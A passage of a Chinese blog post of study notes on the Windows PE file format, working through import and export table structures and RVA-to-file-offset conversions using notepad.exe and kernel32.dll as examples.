<span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;<span class="comment">//导入DLL的名称</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>以notepad.exe为例子：选中部分是为NT头中的OptionalHeader成员</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/5.png" class=""><p>这里为了对照，再贴一次IMAGE_OPTIONAL_HEADER结构体原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>选中部分是为IMAGE_DATA_DIRECTORY DataDirectory的部分：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/6.png" class=""><p>而DataDirectory可以包括</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory</span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory<span class="comment">//IAT</span></span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory</span><br><span class="line">DataDirectory[<span class="number">6l</span> = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY IMPORT Directory</span><br><span class="line">DataDirectoryIE] = COM DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><p>这里IAT用到的是第二个元素</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/7.png" class=""><p>即DataDirectory数组中的import信息中Import的RVA&#x3D;0x00007604   Size&#x3D;0x000000C8</p><p>我们看到的是内存中的，若想进一步查看得结合找出Import信息的RVA位于哪个区段：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/8.png" class=""><p>节区.text中在内存的起始位置&#x3D;0x00001000, size&#x3D;0x00007748, 即从0x00001000-&gt;0x00008748是属于节区.text</p><p>而DataDirectory数组中的import信息中Import的RVA&#x3D;0x00007604 这个RVA落在节区.text区间内，故属于节区.text</p><p>要进一步查看Import信息，需要将Import的RVA转为RAW：观察节区.text的RVA+PointToRawData 确定:</p><p>Raw &#x3D; 0x00007604 - 0x00001000 + 0x00000400 &#x3D; 0x00006A04  查看该地址：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/9.png" class=""><p>每一个_IMAGE_IMPORT_DESCRIPTOR的结构体栈20byte，数组最后以一个结构体为null结束，因此确定所有的IMAGE_IMPORT_DESCRPITOR元素。下图是为NULL的IMAGE_IMPORT_DESCIPTOR：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/10.png" class=""><p>结合IMAGE_IMPORT_DESCRPITOR的结构体成员看下第一个成员对应什么内容：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/11.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><table><thead><tr><th>成员</th><th>值</th><th></th></tr></thead><tbody><tr><td>OriginalFirstThunk</td><td>0x00007990</td><td>INT的地址RVA</td></tr><tr><td>TimeDateStamp</td><td>0xFFFFFFFF</td><td></td></tr><tr><td>ForwarderChain</td><td>0xFFFFFFFF</td><td></td></tr><tr><td>Name</td><td>0x00007AAC</td><td>库名称字符串地址</td></tr><tr><td>FirstThunk</td><td>0x000012C4</td><td>IAT地址 RVA</td></tr></tbody></table><blockquote><p>先是利用NAME中的RVA找到RAW，进而定位到引入的dll文件名字，接着通过OriginalFirstThunk（INT）的RVA找到RAW对应的结构体地址链表，链表节点的每个DWORD代表一个RVA地址，计算出RAW可找到引入的函数名。</p></blockquote><p><strong>OriginalFirstThunk：</strong> 0x00007990 - 0x00001000 + 0x00000400 &#x3D; 0x00006D90:</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/12.png" class=""><p>跟踪0x00007A7A(RVA)可得到导入的API名称：</p><p>&#x3D;&#x3D;API名称&#x3D;&#x3D;：0x00007A7A - 0x00001000 + 0x00000400 &#x3D; 0x00006E7A</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/13.png" class=""><p>前面的0x000F是固定的不管。可以看到导入的API名称是PageSetupDlgw</p><p><strong>Name：</strong> 0x00007AAC - 0x00001000 + 0x00000400 &#x3D; 0x0000A07A &#x3D; 0x00006EAC:</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/14.png" class=""><p>&#x3D;&#x3D;对应导入的dll&#x3D;&#x3D;：comdlg32.dll</p><hr><h5 id="EAT-Export-Address-Table"><a href="#EAT-Export-Address-Table" class="headerlink" title="EAT(Export Address Table)"></a>EAT(Export Address Table)</h5><p>**结构体： ** IMAGE_EXPORT_DIRECTORY</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>存在于PE文件中的格式依旧是采取数组形式存放，位于NT头中最后一个数组成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory<span class="comment">//EAT</span></span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory</span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory</span><br><span class="line">DataDirectory[<span class="number">6l</span> = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY IMPORT Directory</span><br><span class="line">DataDirectoryIE] = COM DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><p>是下标为0的那个内容，其实和IMAGE_IMPORT_DIRECTORY的形式差不多。</p><p>kernel32.dll的Export：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/15.png" class=""><p>即DataDirectory数组中的中起始EXport的RVA&#x3D;0x0000262C   Size&#x3D;0x00006CFD</p><p>故RAW &#x3D; 0x0000262C - 0x00001000 + 0x00000400 &#x3D; 0x00001A2C。</p><p>第一个IMAGE_EXPORT_DIRECTORY结构体：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/16.png" class=""><p>对应的几个重要成员：</p><table><thead><tr><th>成员</th><th>值</th><th>RAW</th><th>备注</th></tr></thead><tbody><tr><td>Name</td><td>0x00004B8E</td><td>0x00003F8E</td><td>库名字：KERNEL32.dll</td></tr><tr><td>NumberOfFunction</td><td>0x000003B9</td><td>-</td><td>导入的API个数</td></tr><tr><td>NumberOfNames</td><td>0x000003B9</td><td>-</td><td></td></tr><tr><td>AddressOfFunctions</td><td>0x00002654</td><td>0x00001A54</td><td>导入的函数地址数组</td></tr><tr><td>AddressOfName</td><td>0x00003538</td><td>0x00002938</td><td>API名的地址数组，元素个数同导入的API</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
